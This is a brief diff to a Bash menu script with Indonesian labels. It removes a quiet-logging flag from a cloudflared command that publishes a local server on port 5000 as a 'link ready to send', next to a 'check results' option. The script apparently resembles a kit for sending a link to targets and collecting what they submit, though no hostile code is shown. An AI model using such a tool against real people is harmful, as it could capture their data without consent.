@@ -40,7 +40,7 @@ case $menu in
         echo ""
         echo -e "${GREEN}🔗 LINK SIAP KIRIM${NC}"
         echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
-        cloudflared tunnel --url http://localhost:5000 --loglevel quiet 2>/dev/null
+        cloudflared tunnel --url http://localhost:5000 2>/dev/null
         ;;
     2)
         echo -e "${GREEN}▶ CEK HASIL${NC}"
